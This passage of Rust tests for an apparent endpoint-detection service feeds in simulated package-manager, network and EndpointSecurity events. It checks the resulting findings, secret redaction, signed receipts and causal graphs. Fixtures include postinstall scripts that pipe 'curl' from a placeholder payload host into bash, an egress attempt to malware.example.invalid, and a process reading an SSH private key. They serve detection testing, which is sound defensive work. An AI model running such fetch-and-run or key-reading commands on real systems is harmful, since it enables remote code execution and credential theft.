            decision_observation["event"]["action"],
            "network_extension_egress"
        );
        assert_eq!(
            decision_observation["event"]["target"],
            "malware.example.invalid:443"
        );
        assert_eq!(decision_observation["event"]["decision"], "blocked");
        assert_eq!(
            decision_observation["event"]["guard"],
            "network_extension_content_filter"
        );
        assert_eq!(payload["receiptCount"], 4);
        let observation_receipts = payload["observationReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension observation receipts"));
        assert_eq!(observation_receipts.len(), 3);
        let flow_observation_id = flow_observation["observationId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing NetworkExtension flow observation id"));
        let flow_observation_receipt = observation_receipts
            .iter()
            .find(|receipt| {
                receipt["receipt"]["metadata"]["endpointDecision"]["decision"]["observationId"]
                    == flow_observation_id
            })
            .unwrap_or_else(|| panic!("missing NetworkExtension flow observation receipt"));
        let receipt: SignedReceipt = serde_json::from_value(flow_observation_receipt.clone())
            .unwrap_or_else(|e| {
                panic!("failed to decode NetworkExtension observation receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing NetworkExtension observation metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "observation");
        assert_eq!(
            endpoint_decision["decision"]["observationId"],
            flow_observation_id
        );
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.network_extension"
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension observation evidence"))
            .iter()
            .any(|item| item["key"] == "observationHash"));
        let policy_receipts = payload["policyDecisionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension policy-decision receipts"));
        assert_eq!(policy_receipts.len(), 1);
        let receipt: SignedReceipt = serde_json::from_value(policy_receipts[0].clone())
            .unwrap_or_else(|e| {
                panic!("failed to decode NetworkExtension policy-decision receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing NetworkExtension policy-decision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "policy_decision");
        assert_eq!(endpoint_decision["decision"]["action"], "block");
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.network_extension"
        );
        assert_eq!(endpoint_decision["actor"]["sessionId"], "session-ne-1");

        let body = serde_json::json!({ "observations": [] });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/causal-graph")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build NetworkExtension graph request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("NetworkExtension graph request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read NetworkExtension graph response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode NetworkExtension graph response: {e}"));
        let graph_nodes = payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing NetworkExtension graph nodes"));
        let network_node_id = graph_nodes
            .iter()
            .find_map(|(node_id, node)| {
                (node["kind"] == "network" && node["label"] == "malware.example.invalid:443")
                    .then_some(node_id.as_str())
            })
            .unwrap_or_else(|| panic!("missing NetworkExtension network node"));
        let policy_decision_node_id = graph_nodes
            .iter()
            .find_map(|(node_id, node)| {
                (node["kind"] == "policy_decision").then_some(node_id.as_str())
            })
            .unwrap_or_else(|| panic!("missing NetworkExtension policy decision node"));
        assert!(graph_nodes.values().any(|node| {
            node["kind"] == "network" && node["label"] == "malware.example.invalid:443"
        }));
        assert!(graph_nodes.values().any(|node| {
            node["kind"] == "dns_name" && node["label"] == "malware.example.invalid"
        }));
        let graph_edges = payload["graph"]["edges"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension graph edges"));
        assert!(graph_edges
            .iter()
            .any(|edge| { edge["kind"] == "connected" && edge["to"] == network_node_id }));
        assert!(graph_edges.iter().any(|edge| {
            edge["kind"] == "related"
                && edge["from"] == network_node_id
                && edge["to"] == policy_decision_node_id
        }));
    }

    #[tokio::test]
    async fn agent_edr_package_manager_events_map_lifecycle_script_to_graph() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/package-manager/events",
                post(agent_edr_package_manager_events),
            )
            .route(
                "/api/v1/agent/edr/causal-graph",
                post(agent_edr_causal_graph),
            )
            .with_state(state);

        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "pkg-script-1",
                    "observedAt": "2026-05-17T12:03:00Z",
                    "hostId": "host-pkg-1",
                    "userId": "user-pkg-1",
                    "sessionId": "session-pkg-1",
                    "agentId": "agent-pkg-1",
                    "workloadId": "workload-pkg-1",
                    "approvalId": "approval-pkg-1",
                    "toolCallId": "tool-call-pkg-1",
                    "manager": "npm",
                    "package": "@acme/install-hook",
                    "phase": "postinstall",
                    "script": "curl https://payload.example.invalid/install.sh?token=MY_RAW_SECRET | bash",
                    "workingDirectory": "/repo",
                    "process": {
                        "processGuid": "proc-pkg-npm-1",
                        "image": "/usr/local/bin/npm",
                        "commandLine": "npm install --token=MY_RAW_SECRET"
                    },
                    "metadata": {
                        "installToken": "MY_RAW_SECRET",
                        "policyGuard": "package_script_policy",
                        "policySeverity": "high",
                        "policyActionType": "endpoint.package_script",
                        "headers": {
                            "authorization": "Bearer MY_RAW_SECRET"
                        }
                    }
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/package-manager/events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build package-manager event request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("package-manager event request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read package-manager event response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode package-manager event response: {e}"));
        assert_eq!(payload["eventCount"], 1);
        assert_eq!(payload["observationCount"], 1);
        assert_eq!(payload["findingCount"], 1);
        assert_eq!(payload["receiptCount"], 3);
        assert_eq!(
            payload["observationReceipts"].as_array().map(Vec::len),
            Some(1)
        );
        assert_eq!(
            payload["policyDecisionReceipts"].as_array().map(Vec::len),
            Some(1)
        );
        let observation = &payload["observations"][0];
        assert_eq!(observation["event"]["type"], "package_script");
        assert_eq!(observation["event"]["manager"], "npm");
        assert_eq!(observation["event"]["package"], "@acme/install-hook");
        assert_eq!(observation["event"]["phase"], "postinstall");
        assert_eq!(
            observation["event"]["script"],
            "curl https://payload.example.invalid/install.sh?token=[REDACTED] | bash"
        );
        assert_eq!(
            observation["process"]["commandLine"],
            "npm install --token=[REDACTED]"
        );
        assert_eq!(observation["metadata"]["installToken"], "[REDACTED]");
        assert_eq!(
            observation["metadata"]["headers"]["authorization"],
            "[REDACTED]"
        );
        assert_eq!(observation["metadata"]["collectorKind"], "package_manager");
        assert_eq!(observation["metadata"]["providerId"], "package_manager.npm");
        assert_eq!(observation["metadata"]["agentId"], "agent-pkg-1");
        assert_eq!(observation["metadata"]["workloadId"], "workload-pkg-1");
        assert_eq!(observation["metadata"]["approvalId"], "approval-pkg-1");
        assert_eq!(observation["metadata"]["toolCallId"], "tool-call-pkg-1");
        assert_eq!(
            observation["metadata"]["packageManagerPhase"],
            "postinstall"
        );
        assert_eq!(
            payload["findings"][0]["ruleId"],
            "supply_chain.install_script.risky"
        );
        let finding_evidence = payload["findings"][0]["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing package-manager finding evidence"));
        for (key, value) in [
            ("hostId", "host-pkg-1"),
            ("userId", "user-pkg-1"),
            ("sessionId", "session-pkg-1"),
            ("processGuid", "proc-pkg-npm-1"),
            ("agentId", "agent-pkg-1"),
            ("workloadId", "workload-pkg-1"),
            ("approvalId", "approval-pkg-1"),
            ("toolCallId", "tool-call-pkg-1"),
        ] {
            assert!(
                finding_evidence
                    .iter()
                    .any(|item| item["key"] == key && item["value"] == value),
                "missing package-manager finding evidence {key}"
            );
        }
        let signed: SignedReceipt = serde_json::from_value(payload["receipts"][0].clone())
            .unwrap_or_else(|e| panic!("failed to decode package-manager receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing package-manager endpoint decision"));
        assert_eq!(endpoint_decision["actor"]["hostId"], "host-pkg-1");
        assert_eq!(endpoint_decision["actor"]["userId"], "user-pkg-1");
        assert_eq!(endpoint_decision["actor"]["sessionId"], "session-pkg-1");
        assert_eq!(endpoint_decision["actor"]["agentId"], "agent-pkg-1");
        assert_eq!(endpoint_decision["actor"]["workloadId"], "workload-pkg-1");
        assert_eq!(endpoint_decision["actor"]["approvalId"], "approval-pkg-1");
        for (key, value) in [
            ("hostId", "host-pkg-1"),
            ("userId", "user-pkg-1"),
            ("sessionId", "session-pkg-1"),
            ("processGuid", "proc-pkg-npm-1"),
            ("agentId", "agent-pkg-1"),
            ("workloadId", "workload-pkg-1"),
            ("approvalId", "approval-pkg-1"),
            ("toolCallId", "tool-call-pkg-1"),
        ] {
            assert!(
                receipt_evidence_hash_matches(&signed, key, value),
                "missing package-manager signed evidence {key}"
            );
        }
        let policy_receipt: SignedReceipt =
            serde_json::from_value(payload["policyDecisionReceipts"][0].clone()).unwrap_or_else(
                |e| panic!("failed to decode package-manager policy decision receipt: {e}"),
            );
        let policy_endpoint_decision = policy_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing package-manager policy decision endpoint metadata"));
        assert_eq!(policy_endpoint_decision["receiptFamily"], "policy_decision");
        assert_eq!(policy_endpoint_decision["decision"]["action"], "block");
        assert_eq!(policy_endpoint_decision["decision"]["severity"], "high");
        assert_eq!(
            policy_endpoint_decision["decision"]["ruleId"],
            "endpoint.policy_decision.endpoint.package_script"
        );
        assert_eq!(
            policy_endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "package_manager.npm"
        );
        assert!(
            policy_endpoint_decision["decision"]["observationId"]
                .as_str()
                .is_some_and(
                    |value| value.starts_with("package_manager_policy_decision_observation-")
                )
        );
        assert!(receipt_evidence_hash_matches(
            &policy_receipt,
            "observationId",
            policy_endpoint_decision["decision"]["observationId"]
                .as_str()
                .unwrap_or_default()
        ));
        assert_eq!(policy_endpoint_decision["decision"]["passed"], false);
        assert!(policy_endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing package-manager policy decision receipt evidence"))
            .iter()
            .any(|item| item["key"] == "allowed"));
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));

        let body = serde_json::json!({ "observations": [] });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/causal-graph")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build package-manager graph request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("package-manager graph request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read package-manager graph response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode package-manager graph response: {e}"));
        let graph_nodes = payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing package-manager graph nodes"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "package_script"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "policy_decision"));
        assert!(graph_nodes.values().any(|node| node["kind"] == "process"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "agent" && node["label"] == "agent-pkg-1"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "workload" && node["label"] == "workload-pkg-1"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "approval" && node["label"] == "approval-pkg-1"));
    }

    #[tokio::test]
    async fn agent_edr_package_manager_events_accept_bun_lifecycle_script() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/package-manager/events",
                post(agent_edr_package_manager_events),
            )
            .with_state(state);

        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "pkg-script-bun-1",
                    "observedAt": "2026-05-17T12:04:00Z",
                    "manager": "bun",
                    "package": "@acme/bun-install-hook",
                    "phase": "postinstall",
                    "script": "curl https://payload.example.invalid/bun.sh | bash",
                    "workingDirectory": "/repo"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/package-manager/events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build bun package-manager event request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("bun package-manager event request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read bun package-manager event response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode bun package-manager event response: {e}"));

        assert_eq!(payload["observations"][0]["event"]["manager"], "bun");
        assert_eq!(
            payload["findings"][0]["ruleId"],
            "supply_chain.install_script.risky"
        );
    }

    #[tokio::test]
    async fn agent_edr_package_manager_events_accept_extended_manager_values() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/package-manager/events",
                post(agent_edr_package_manager_events),
            )
            .with_state(state);

        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "pkg-script-composer-1",
                    "observedAt": "2026-05-17T12:04:01Z",
                    "manager": "composer",
                    "package": "vendor/package",
                    "phase": "install",
                    "script": "composer require vendor/package"
                },
                {
                    "eventId": "pkg-script-maven-1",
                    "observedAt": "2026-05-17T12:04:02Z",
                    "manager": "maven",
                    "phase": "package",
                    "script": "mvn package"
                },
                {
                    "eventId": "pkg-script-gradle-1",
                    "observedAt": "2026-05-17T12:04:03Z",
                    "manager": "gradle",
                    "phase": "build",
                    "script": "./gradlew build"
                },
                {
                    "eventId": "pkg-script-uv-1",
                    "observedAt": "2026-05-17T12:04:04Z",
                    "manager": "uv",
                    "package": "ruff",
                    "phase": "install",
                    "script": "uv pip install ruff"
                },
                {
                    "eventId": "pkg-script-poetry-1",
                    "observedAt": "2026-05-17T12:04:05Z",
                    "manager": "poetry",
                    "package": "requests",
                    "phase": "install",
                    "script": "poetry add requests"
                },
                {
                    "eventId": "pkg-script-pipenv-1",
                    "observedAt": "2026-05-17T12:04:06Z",
                    "manager": "pipenv",
                    "package": "pytest",
                    "phase": "install",
                    "script": "pipenv install pytest"
                },
                {
                    "eventId": "pkg-script-dotnet-1",
                    "observedAt": "2026-05-17T12:04:07Z",
                    "manager": "dotnet",
                    "package": "Newtonsoft.Json",
                    "phase": "install",
                    "script": "dotnet add package Newtonsoft.Json"
                },
                {
                    "eventId": "pkg-script-nuget-1",
                    "observedAt": "2026-05-17T12:04:08Z",
                    "manager": "nuget",
                    "package": "Newtonsoft.Json",
                    "phase": "install",
                    "script": "nuget install Newtonsoft.Json"
                },
                {
                    "eventId": "pkg-script-swift-1",
                    "observedAt": "2026-05-17T12:04:09Z",
                    "manager": "swift",
                    "phase": "install",
                    "script": "swift package resolve"
                },
                {
                    "eventId": "pkg-script-mix-1",
                    "observedAt": "2026-05-17T12:04:10Z",
                    "manager": "mix",
                    "package": "phoenix",
                    "phase": "install",
                    "script": "mix deps.get phoenix"
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/package-manager/events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build extended package-manager event request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("extended package-manager event request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read extended package-manager event response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode extended package-manager event response: {e}")
        });
        assert_eq!(payload["observationCount"], 10);
        let managers = payload["observations"]
            .as_array()
            .unwrap_or_else(|| panic!("missing package-manager observations"))
            .iter()
            .map(|observation| observation["event"]["manager"].as_str().unwrap_or_default())
            .collect::<BTreeSet<_>>();
        for manager in [
            "composer", "maven", "gradle", "uv", "poetry", "pipenv", "dotnet", "nuget", "swift",
            "mix",
        ] {
            assert!(managers.contains(manager), "missing manager {manager}");
        }
    }

    #[tokio::test]
    async fn agent_edr_endpoint_security_events_map_process_file_auth_to_graph() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/endpoint-security/events",
                post(agent_edr_endpoint_security_events),
            )
            .route(
                "/api/v1/agent/edr/causal-graph",
                post(agent_edr_causal_graph),
            )
            .with_state(state);

        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "es-exec-1",
                    "kind": "process_exec",
                    "observedAt": "2026-05-17T12:01:00Z",
                    "hostId": "host-es-1",
                    "userId": "user-es-1",
                    "sessionId": "session-es-1",
                    "pid": 5001,
                    "ppid": 4999,
                    "processGuid": "proc-es-python-1",
                    "parentProcessGuid": "proc-es-shell-1",
                    "image": "/usr/bin/python3",
                    "args": ["deploy.py", "--token", "MY_RAW_SECRET"],
                    "commandLine": "python3 deploy.py --token=MY_RAW_SECRET",
                    "cwd": "/tmp/project",
                    "metadata": {
                        "apiToken": "MY_RAW_SECRET",
                        "headers": {
                            "authorization": "Bearer MY_RAW_SECRET"
                        }
                    }
                },
                {
                    "eventId": "es-file-1",
                    "kind": "file_access",
                    "observedAt": "2026-05-17T12:01:01Z",
                    "hostId": "host-es-1",
                    "userId": "user-es-1",
                    "sessionId": "session-es-1",
                    "pid": 5001,
                    "processGuid": "proc-es-python-1",
                    "image": "/usr/bin/python3",
                    "path": "/tmp/project/payload.py",
                    "operation": "write"
                },
                {
                    "eventId": "es-auth-1",
                    "kind": "auth_open",
                    "observedAt": "2026-05-17T12:01:02Z",
                    "hostId": "host-es-1",
                    "userId": "user-es-1",
                    "sessionId": "session-es-1",
                    "pid": 5001,
                    "processGuid": "proc-es-python-1",
                    "image": "/usr/bin/python3",
                    "path": "/Users/alice/.ssh/id_rsa",
                    "decision": "deny",
                    "reason": "honey_credential",
                    "deadlineMissed": false,
                    "deadlineMs": 50
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/endpoint-security/events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build EndpointSecurity event request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("EndpointSecurity event request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read EndpointSecurity event response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode EndpointSecurity event response: {e}"));
        assert_eq!(payload["eventCount"], 3);
        assert_eq!(payload["observationCount"], 4);
        let observations = payload["observations"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity observations"));
        let exec_observation = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "process_exec")
            .unwrap_or_else(|| panic!("missing EndpointSecurity process observation"));
        assert_eq!(exec_observation["process"]["pid"], 5001);
        assert_eq!(exec_observation["process"]["ppid"], 4999);
        assert_eq!(
            exec_observation["process"]["processGuid"],
            "proc-es-python-1"
        );
        assert_eq!(
            exec_observation["process"]["parentProcessGuid"],
            "proc-es-shell-1"
        );
        assert_eq!(exec_observation["event"]["image"], "/usr/bin/python3");
        assert_eq!(exec_observation["event"]["args"][0], "deploy.py");
        assert_eq!(exec_observation["event"]["args"][1], "--token");
        assert_eq!(exec_observation["event"]["args"][2], "[REDACTED]");
        assert_eq!(
            exec_observation["process"]["commandLine"],
            "python3 deploy.py --token=[REDACTED]"
        );
        assert_eq!(
            exec_observation["metadata"]["collectorKind"],
            "endpoint_security"
        );
        assert_eq!(
            exec_observation["metadata"]["providerId"],
            "macos.endpoint_security"
        );
        assert_eq!(
            exec_observation["metadata"]["endpointSecurityEventKind"],
            "process_exec"
        );
        assert_eq!(exec_observation["metadata"]["apiToken"], "[REDACTED]");
        assert_eq!(
            exec_observation["metadata"]["headers"]["authorization"],
            "[REDACTED]"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));

        let file_observation = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "file_access")
            .unwrap_or_else(|| panic!("missing EndpointSecurity file observation"));
        assert_eq!(file_observation["event"]["path"], "/tmp/project/payload.py");
        assert_eq!(file_observation["event"]["operation"], "write");
        assert_eq!(
            file_observation["metadata"]["endpointSecurityEventKind"],
            "file_access"
        );

        let auth_observation = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "policy_decision")
            .unwrap_or_else(|| panic!("missing EndpointSecurity auth observation"));
        assert_eq!(
            auth_observation["event"]["action"],
            "endpoint_security_auth_open"
        );
        assert_eq!(
            auth_observation["event"]["target"],
            "/Users/alice/.ssh/id_rsa"
        );
        assert_eq!(auth_observation["event"]["decision"], "blocked");
        assert_eq!(auth_observation["event"]["guard"], "endpoint_security_auth");
        assert_eq!(auth_observation["metadata"]["deadlineMissed"], false);
        assert_eq!(auth_observation["metadata"]["deadlineMs"], 50);

        let credential_observation = observations
            .iter()
            .find(|observation| observation["event"]["type"] == "credential_access")
            .unwrap_or_else(|| panic!("missing EndpointSecurity auth credential observation"));
        assert_eq!(
            credential_observation["event"]["path"],
            "/Users/alice/.ssh/id_rsa"
        );
        assert_eq!(credential_observation["event"]["kind"], "ssh_key");
        assert_eq!(
            credential_observation["metadata"]["derivedFrom"],
            "endpoint_security_auth_open"
        );

        assert!(
            payload["receiptCount"].as_u64().unwrap_or_default() >= 5,
            "expected observation and policy receipts for derived auth credential"
        );
        let observation_receipts = payload["observationReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity observation receipts"));
        assert_eq!(observation_receipts.len(), 4);
        let auth_observation_id = auth_observation["observationId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing EndpointSecurity auth observation id"));
        let auth_observation_receipt = observation_receipts
            .iter()
            .find(|receipt| {
                receipt["receipt"]["metadata"]["endpointDecision"]["decision"]["observationId"]
                    == auth_observation_id
            })
            .unwrap_or_else(|| panic!("missing EndpointSecurity auth observation receipt"));
        let receipt: SignedReceipt = serde_json::from_value(auth_observation_receipt.clone())
            .unwrap_or_else(|e| {
                panic!("failed to decode EndpointSecurity observation receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing EndpointSecurity observation metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "observation");
        assert_eq!(
            endpoint_decision["decision"]["observationId"],
            auth_observation_id
        );
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.endpoint_security"
        );
        assert_eq!(endpoint_decision["actor"]["userId"], "user-es-1");
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity observation evidence"))
            .iter()
            .any(|item| item["key"] == "observationHash"));
        let policy_receipts = payload["policyDecisionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity policy-decision receipts"));
        assert_eq!(policy_receipts.len(), 1);
        let receipt: SignedReceipt = serde_json::from_value(policy_receipts[0].clone())
            .unwrap_or_else(|e| {
                panic!("failed to decode EndpointSecurity policy-decision receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing EndpointSecurity policy-decision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "policy_decision");
        assert_eq!(endpoint_decision["decision"]["action"], "block");
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.endpoint_security"
        );
        assert_eq!(endpoint_decision["actor"]["userId"], "user-es-1");

        let body = serde_json::json!({ "observations": [] });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/causal-graph")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build EndpointSecurity graph request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("EndpointSecurity graph request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read EndpointSecurity graph response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode EndpointSecurity graph response: {e}"));
        let graph_nodes = payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing EndpointSecurity graph nodes"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "file" && node["label"] == "/tmp/project/payload.py"));
        assert!(graph_nodes
            .values()
            .any(|node| node["kind"] == "policy_decision"));
        assert!(graph_nodes.values().any(
            |node| node["kind"] == "credential" && node["label"] == "/Users/alice/.ssh/id_rsa"
        ));
        assert!(payload["graph"]["edges"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity graph edges"))
            .iter()
            .any(|edge| edge["kind"] == "spawned"));
    }

    #[tokio::test]
    async fn agent_edr_endpoint_security_event_loss_emits_degradation_receipt() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/endpoint-security/events",
                post(agent_edr_endpoint_security_events),
            )
            .with_state(state);

        let body = serde_json::json!({
            "events": [
                {
                    "eventId": "es-loss-1",
                    "kind": "event_loss",
                    "observedAt": "2026-05-17T12:02:00Z",
                    "hostId": "host-es-1",
                    "reason": "kernel queue overflow",
                    "droppedEventCount": 3,
                    "deadlineMissCount": 2,
                    "fullDiskAccess": false
                }
            ]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/endpoint-security/events")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build EndpointSecurity event-loss request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("EndpointSecurity event-loss request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read EndpointSecurity event-loss response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode EndpointSecurity event-loss response: {e}")
        });
        assert_eq!(payload["eventCount"], 1);
        assert_eq!(payload["observationCount"], 1);
        assert_eq!(payload["observations"][0]["event"]["type"], "other");
        assert_eq!(
            payload["observations"][0]["event"]["category"],
            "endpoint_security_event_loss"
        );
        assert_eq!(
            payload["observations"][0]["metadata"]["droppedEventCount"],
            3
        );
        assert_eq!(
            payload["observations"][0]["metadata"]["deadlineMissCount"],
            2
        );
        assert_eq!(
            payload["observations"][0]["metadata"]["fullDiskAccess"],
            false
        );
        assert_eq!(payload["receiptCount"], 2);
        let observation_receipts = payload["observationReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity event-loss observation receipts"));
        assert_eq!(observation_receipts.len(), 1);
        let receipt: SignedReceipt = serde_json::from_value(observation_receipts[0].clone())
            .unwrap_or_else(|e| {
                panic!("failed to decode EndpointSecurity event-loss observation receipt: {e}")
            });
        let endpoint_decision = receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| {
                panic!("missing EndpointSecurity event-loss observation endpointDecision")
            });
        assert_eq!(endpoint_decision["receiptFamily"], "observation");
        assert_eq!(
            endpoint_decision["sensorState"]["providers"][0]["providerId"],
            "macos.endpoint_security"
        );
        let degraded_receipts = payload["degradedProviderReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing EndpointSecurity degradation receipts"));
        assert_eq!(degraded_receipts.len(), 1);
        let receipt: SignedReceipt = serde_json::from_value(degraded_receipts[0].clone())
